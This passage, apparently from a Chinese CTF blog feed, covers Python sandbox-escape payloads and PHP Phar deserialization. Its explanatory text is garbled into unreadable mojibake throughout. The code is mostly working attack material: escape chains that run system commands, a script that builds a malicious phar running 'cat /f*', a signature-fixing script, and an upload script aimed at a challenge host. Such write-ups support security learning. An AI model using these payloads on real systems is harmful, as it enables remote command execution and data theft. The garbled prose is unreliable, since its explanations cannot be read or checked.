class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span> command <span class="hljs-keyword">in</span> _<span class="hljs-keyword">global</span>     <span class="hljs-comment"># do calculate in a sandboxed environment</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> e<br>        return0<br>    result = _<span class="hljs-keyword">global</span>[<span class="hljs-string">&#x27;result&#x27;</span>]  <span class="hljs-comment"># extract the result</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>banner()<br>while1:<br>    command = getexp()<br>    <span class="hljs-built_in">print</span> sandbox_exec(command)<br></code></pre></td></tr></table></figure><p><code>exec command in _global</code>è¿™ä¸€å¥å°±æŠŠå¾ˆå¤š payload å¹²æ‰äº†ï¼Œç”±äº exec è¿è¡Œåœ¨è‡ªå®šä¹‰çš„å…¨å±€å‘½åç©ºé—´é‡Œï¼Œè¿™æ—¶å€™ä¼šå¤„äº<code>restricted execution mode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__<br>restricted attribute<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>), <span class="hljs-string">&#x27;FileType&#x27;</span>)(<span class="hljs-string">&#x27;key&#x27;</span>), <span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)()<br>file() constructor <span class="hljs-keyword">not</span> accessible <span class="hljs-keyword">in</span> restricted mode<br></code></pre></td></tr></table></figure><p>ä¸è¿‡ä¹Ÿæ­£æ˜¯ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼Œæ¯”å¦‚ types,json åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).__builtins__[<span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>]](<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;mets&#x27;</span><span class="hljs-string">&#x27;ys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">getattr</span>(().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>), <span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;yst&#x27;</span>+<span class="hljs-string">&#x27;em&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªpayloadæœ¬è´¨åŒºåˆ«åœ¨å–å¯¼å…¥çš„æ—¶ä¸åŒçš„åº“</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Phar</title>
    <link href="/blog/2025/01/23/PHP/Phar/"/>
    <url>/blog/2025/01/23/PHP/Phar/</url>
    
    <content type="html"><![CDATA[<h2 id="Pharæ˜¯ä»€ä¹ˆ"><a href="#Pharæ˜¯ä»€ä¹ˆ" class="headerlink" title="Pharæ˜¯ä»€ä¹ˆ"></a>Pharæ˜¯ä»€ä¹ˆ</h2><p>Pharæ˜¯ä¸€ç§æ–‡ä»¶æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œæ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ã€‚ç®€å•æ¥è¯´ç±»ä¼¼äºZIPå’Œtar</p><h2 id="Pharæ–‡ä»¶ç»“æ„"><a href="#Pharæ–‡ä»¶ç»“æ„" class="headerlink" title="Pharæ–‡ä»¶ç»“æ„"></a>Pharæ–‡ä»¶ç»“æ„</h2><h3 id="1-stubæ–‡ä»¶æ ‡è¯†"><a href="#1-stubæ–‡ä»¶æ ‡è¯†" class="headerlink" title="1.stubæ–‡ä»¶æ ‡è¯†"></a>1.stubæ–‡ä»¶æ ‡è¯†</h3><ul><li>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶</li></ul><h3 id="2-manifest-ï¼ˆæ¸…å•Pharé‡Œé¢å†…å®¹ä¿¡æ¯ï¼‰"><a href="#2-manifest-ï¼ˆæ¸…å•Pharé‡Œé¢å†…å®¹ä¿¡æ¯ï¼‰" class="headerlink" title="2.manifest ï¼ˆæ¸…å•Pharé‡Œé¢å†…å®¹ä¿¡æ¯ï¼‰"></a>2.manifest ï¼ˆæ¸…å•Pharé‡Œé¢å†…å®¹ä¿¡æ¯ï¼‰</h3><ul><li>Pharæ–‡ä»¶ä¸­è¢«å‹ç¼©çš„æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­Meta-dataéƒ¨åˆ†çš„ä¿¡æ¯ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜ï¼ˆå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ï¼‰</li></ul><h3 id="3-contents"><a href="#3-contents" class="headerlink" title="3. contents"></a>3. contents</h3><ul><li>è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ²¡æœ‰ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹å¯ä»¥éšä¾¿å†™çš„ï¼Œå› ä¸ºæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘å®ƒçš„ååºåˆ—åŒ–</li></ul><h3 id="4-signatureï¼ˆç­¾åï¼‰"><a href="#4-signatureï¼ˆç­¾åï¼‰" class="headerlink" title="4.signatureï¼ˆç­¾åï¼‰"></a>4.signatureï¼ˆç­¾åï¼‰</h3><ul><li>pharçš„æœ€åæœ‰ä¸€æ®µsignatureï¼Œæ˜¯pharçš„ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†æ–‡ä»¶çš„å†…å®¹ï¼Œä¹‹å‰çš„ç­¾åå°±ä¼šæ— æ•ˆï¼Œå°±éœ€è¦æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾åã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆfile_exists()ã€is_dir()ç­‰è¯¦è§ä¸‹è¡¨ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar:&#x2F;&#x2F;ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</li></ul><h2 id="Pharå’ŒPharä¼ªåè®®ä½¿ç”¨ç¯å¢ƒ"><a href="#Pharå’ŒPharä¼ªåè®®ä½¿ç”¨ç¯å¢ƒ" class="headerlink" title="Pharå’ŒPharä¼ªåè®®ä½¿ç”¨ç¯å¢ƒ"></a>Pharå’ŒPharä¼ªåè®®ä½¿ç”¨ç¯å¢ƒ</h2><ul><li>phpå¤§äº5.3.0</li><li>éœ€è¦å°†php.iniçš„å‚æ•°phar.readonlyè®¾ç½®ä¸ºoff</li></ul><h2 id="å¦‚ä½•ç”Ÿæˆä¸€ä¸ªPharæ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemo"><a href="#å¦‚ä½•ç”Ÿæˆä¸€ä¸ªPharæ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemo" class="headerlink" title="å¦‚ä½•ç”Ÿæˆä¸€ä¸ªPharæ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemo"></a>å¦‚ä½•ç”Ÿæˆä¸€ä¸ªPharæ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemo</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Pharåœ¨CTFåº”ç”¨"><a href="#Pharåœ¨CTFåº”ç”¨" class="headerlink" title="Pharåœ¨CTFåº”ç”¨"></a>Pharåœ¨CTFåº”ç”¨</h2><ol><li><p>ååºåˆ—åŒ–ã€‚phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹</p><table><thead><tr><th>å—å½±å“å‡½æ•°çš„åˆ—è¡¨</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeab</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table></li></ol><h4 id="ä»¥Newstar-2023-week5ä¸­-Unserialize-Againä¸¾ä¾‹å¦‚ä½•åœ¨ctfååºåˆ—åŒ–ä¸­åº”ç”¨"><a href="#ä»¥Newstar-2023-week5ä¸­-Unserialize-Againä¸¾ä¾‹å¦‚ä½•åœ¨ctfååºåˆ—åŒ–ä¸­åº”ç”¨" class="headerlink" title="ä»¥Newstar 2023 week5ä¸­ Unserialize Againä¸¾ä¾‹å¦‚ä½•åœ¨ctfååºåˆ—åŒ–ä¸­åº”ç”¨"></a>ä»¥Newstar 2023 week5ä¸­ Unserialize Againä¸¾ä¾‹å¦‚ä½•åœ¨ctfååºåˆ—åŒ–ä¸­åº”ç”¨</h4><p>é¢˜ç›®å…·ä½“å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œå…¶æ¬¡file_get_contents(â€˜php:&#x2F;&#x2F;inputâ€™)æ¥å—ç”¨æˆ·POSTæ–¹å¼æäº¤è¿‡æ¥çš„å‚æ•°ï¼Œå°†POSTæäº¤è¿‡æ¥çš„å‚æ•°è§£ç æ”¾åˆ°$pearé‡Œé¢</p><p>ï¼Œå…¶æ¬¡file_existsè¿™ä¸ªå‡½æ•°æ˜¯æ£€æµ‹æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯$Adamä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®è¯»å–pharæ–‡ä»¶çš„è¯ï¼Œè‡ªåŠ¨æ‰§è¡Œ<code>unserialize()</code>çš„æ“ä½œæ²¡æœ‰ä¾èµ–äº<code>unserialize()</code>è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸”æ­£å¥½åœ¨ä¸Šé¢æåŠåˆ°å—å½±å“çš„å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯</p><img src="/blog/2025/01/23/PHP/Phar/image-20250123202947693.png" class><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ pharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;                 <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…¶æ¬¡éœ€è¦<code>__wakeup()</code>å› ä¸º<code>__wakeup()</code>ä¼šæ¯”<code>__destruct()</code>å…ˆæ‰§è¡Œ</p><p>å€ŸåŠ©ï¼šå±æ€§ä¸ªæ•°ä¸åŒ¹é…(cve-2016-7124)æ¥ç»•è¿‡</p><p>å—å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><img src="/blog/2025/01/23/PHP/Phar/image-20250123202851640.png" class><p>å°†4ä¿®æ”¹ä¸º5</p><h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h4><ul><li><p>ä¿®æ”¹åpharçš„æ–‡ä»¶çš„ç­¾åå°±ä¸ç®¡ç”¨äº†éœ€è¦é‡æ–°ç”Ÿæˆä¸€ä¸ªï¼Œéœ€è¦ä¸€ä¸ªæ–°çš„ç­¾åï¼Œç­¾åç”¨sha1åŠ å¯†ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hack.phar&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    text = f.read()<br>s = text[:-<span class="hljs-number">28</span>]<br>h = text[-<span class="hljs-number">8</span>:]<br>newf = s + sha1(s).digest() + h<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hacker1.phar&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(newf)<br></code></pre></td></tr></table></figure></li></ul><p>æ¥ä¸‹æ¥å°±æ˜¯ä¼ æ•°æ®äº†å¯ä»¥ç”¨pythonè„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¼ æœ‰ç‚¹éº»çƒ¦éœ€è¦å°†pharæ–‡ä»¶å†…å®¹ç»è¿‡urlç¼–ç åï¼Œé€šè¿‡POSTæ–¹å¼ä¼ è¿‡å»æœ€åGETä¼  ?pear&#x3D;hacker1.phar&amp;apple&#x3D;phar:&#x2F;&#x2F;hacker1.phar å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://83520740-e875-4e0e-904f-7dc11b8d2a3f.node5.buuoj.cn:81/&#x27;</span><br>params=&#123;<br>    <span class="hljs-string">&#x27;pear&#x27;</span>:<span class="hljs-string">&#x27;hacker1.phar&#x27;</span>, <br>    <span class="hljs-string">&#x27;apple&#x27;</span>:<span class="hljs-string">&#x27;phar://hacker1.phar&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;22.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f)<br>    fin=requests.post(url=url+<span class="hljs-string">&quot;pairing.php&quot;</span>,data=ff,params=params)<br>    <span class="hljs-built_in">print</span>(fin.text)<br></code></pre></td></tr></table></figure><h4 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="SWPU 2018-SimplePHP"></a>SWPU 2018-SimplePHP</h4><p>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–+phar</p><p>ç»™äº†ä¸‰ä¸ªæ–‡ä»¶class.php,file.php,upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 